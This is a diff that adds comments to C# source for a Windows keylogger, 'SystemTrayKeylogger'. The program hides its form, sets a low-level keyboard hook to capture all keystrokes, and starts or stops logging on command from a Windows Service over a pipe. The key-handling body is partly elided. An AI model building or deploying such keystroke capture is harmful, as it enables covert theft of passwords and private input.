@@ -14,6 +14,13 @@ using System.ServiceModel;
 
 namespace WTKL
 {
+    /* This class is the keylogger application. This application will be run by the user when
+     * they login to their Windows user. Once it starts the application will sit idling until
+     * it is signaled by the Windows Service to start keylogging. It will continue keylogging
+     * until the Windows Service signals it to stop. Keylogging is done by using Windows hooks
+     * to hook into the user input and capture all keyboard input and then pass it along to
+     * the rest of the computer.
+     */
     class SystemTrayKeylogger : Form, KeyloggerCommInterface
     {
         private NotifyIcon trayIcon;
@@ -25,6 +32,9 @@ namespace WTKL
         private static bool logging = false;
         private ServiceHost host;
 
+        /* The constructor creates the needed windows form components for the application
+         * to run in the system tray.
+         */
         public SystemTrayKeylogger()
         {
             trayIcon = new NotifyIcon();
@@ -37,6 +47,9 @@ namespace WTKL
             trayIcon.Visible = true;
         }
 
+        /* This method is the first method to be ran when the application starts. Just like
+         * the service this can be thought of as the main method.
+         */
         protected override void OnLoad(EventArgs e)
         {
             this.Visible = false;
@@ -49,12 +62,18 @@ namespace WTKL
             StartKeylogger();
         }
 
+        /* This is the method that is called just before the application stops running,
+         * calls to save and close connections should be put here.
+         */
         private void OnExit(object sender, EventArgs e)
         {
             ClosePipe();
             Application.Exit();
         }
 
+        /* This method is here to make sure that the system tray icon is properly disposed
+         * of so it disappears as soon as the application is closed.
+         */
         protected override void Dispose(bool isDisposing)
         {
             if (isDisposing)
@@ -64,13 +83,16 @@ namespace WTKL
             base.Dispose(isDisposing);
         }
 
+        //Simply starts the application running, the first method called after this is OnLoad.
         [STAThread]
         public static void Main()
         {
-            //_hookID = SetHook(_proc); //todo try moving SetHook to StartKeylogger method
             Application.Run(new SystemTrayKeylogger());
         }
 
+        /* This method creates a new pipe to connect with the Windows Service and then opens
+         * the connection.
+         */
         private void CreateOpenPipe()
         {
             host = new ServiceHost(typeof(SystemTrayKeylogger));
@@ -78,11 +100,15 @@ namespace WTKL
             host.Open();
         }
 
+        //Closes the connection between the Windows Service and this application
         private void ClosePipe()
         {
             host.Close();
         }
 
+        /* Starts the keylogger. This is one of the methods that is publicly exposed by the
+         * KeyloggerCommInterface and is called over the pipe.
+         */
         public bool StartKeylogger()
         {
             _hookID = SetHook(_proc);
@@ -90,21 +116,39 @@ namespace WTKL
             return logging;
         }
 
+        /* Stops the keylogger. This is one of the methods that is publicly exposed by the
+         * KeyloggerCommInterface and is called over the pipe.
+         */
         public bool StopKeylogger()
         {
+            UnhookWindowsHookEx(_hookID);
             logging = false;
             return logging;
         }
 
+        /* Simply returns true just to let the Windows Service know that it is running. This always
+         * returns true because if it's not running then there will be no application to connect to.
+         * Need to make sure there's proper error handling being done on the Windows Service side
+         * of this method.
+         */
         public bool CheckIfRunning()
         {
             return true;
         }
 
+        /* Delegate for use with callback methods. The variable _proc is created of this type and
+         * set equal to the HookCallback method. Whenever there is user input the _proc variable
+         * is used to call the HookCallback function.
+         */
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        /* HookCallback is where the actual reading of user inputs takes place in our application.
+         * The method is called by the delegate above whenever there is user input detected by
+         * the operating system.
+         */
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
+            //todo figure out how to edit this keylogging code
             if (logging && nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -115,6 +159,10 @@ namespace WTKL
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
+        /* This method is used to set our application's hook into the Windows keyboard
+         * input hook chain. It is passed a delegate to be used to call our HookCallback
+         * method so we can handle the captured inputs.
+         */
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -124,6 +172,9 @@ namespace WTKL
             }
         }
 
+        /*******************************************************************************
+         **************************** DLL Import References ****************************
+         *******************************************************************************/
         [DllImport("User32.dll")]
         private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
 
